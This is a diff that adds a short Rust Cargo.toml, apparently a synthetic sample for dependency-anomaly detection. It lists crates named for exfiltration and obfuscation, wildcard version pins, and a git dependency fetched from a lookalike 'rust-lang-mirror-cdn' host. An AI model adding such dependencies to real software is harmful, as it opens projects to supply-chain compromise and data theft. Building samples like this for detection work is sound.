@@ -1,0 +1,12 @@
+[package]
+name = "syn_depanomaly_253"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+anon-http-client = "0.0.1"
+quiet-exfil = "0.0.1"
+sys-info = { git = "https://github.com/rust-lang-mirror-cdn/sys-info-mirror" }
+obfstr = "*"
+xor-crypt = "*"
+
